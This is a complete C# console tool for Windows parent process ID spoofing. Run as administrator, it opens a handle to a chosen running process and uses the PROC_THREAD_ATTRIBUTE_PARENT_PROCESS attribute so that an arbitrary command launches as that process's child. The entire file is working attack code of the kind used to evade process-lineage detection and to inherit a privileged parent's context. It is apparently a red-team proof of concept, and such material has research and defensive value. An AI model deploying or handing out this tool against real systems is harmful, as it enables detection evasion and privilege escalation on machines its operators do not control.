using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace RFC_DuplicateHandle
{
    internal class Program
    {
        #region Win32 Apis

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        #endregion

        static void Main(string[] args)
        {
            // check we are running as administrator
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("[!] You much be running as Administrator!");
                return;
            }

            if (args.Length == 0 || !(args.Length == 2))
            {
                Console.WriteLine("Usage: RFC_DuplicateHandle <TargetProcess> <Command>");
                return;
            }

            string TargetProcess = args[0];
            string Command = args[1];

            Console.WriteLine($"[*] Checking if target process({TargetProcess}) is running ...");

            if (System.Diagnostics.Process.GetProcessesByName(TargetProcess).Length == 0)
            {
                Console.WriteLine($"[!] Target process({TargetProcess}) is not running!. Exiting ...");
                return;
            }

            Process[] TargetProcessName = Process.GetProcessesByName(TargetProcess);
            int TargetProcessId = TargetProcessName[0].Id;

            Console.WriteLine($"[*] Trying to open a handle to {TargetProcessName[0].ProcessName}");
            try
            {
                const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

                const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
                const uint CREATE_NEW_CONSOLE = 0x00000010;

                var pInfo = new PROCESS_INFORMATION();
                var siEx = new STARTUPINFOEX();

                IntPtr lpValueProc = IntPtr.Zero;
                IntPtr lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr pTargetProcess = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, TargetProcessId);

                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, pTargetProcess);

                UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                try
                {
                    Console.WriteLine($"[*] Creating a new process with {TargetProcessName[0].ProcessName} as parent ...");

                    bool success = CreateProcess(null, Command, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref siEx, out pInfo);
                    if (!success)
                    {
                        Console.WriteLine($"[!] CreateProcess Failed for {Command}! ERROR: {GetLastError()} Exiting ...");
                        return;
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine($"[!] Failed creating a new process with {TargetProcessName[0].ProcessName} as parent! ERROR: {GetLastError()} Exiting ...");
                    return;
                }
            }
            catch (Exception)
            {
                Console.WriteLine($"[!] Failed opening a handle to {TargetProcessName[0].ProcessName}! ERROR: {GetLastError()} Exiting ...");
                return;
            }
        }
    }
}
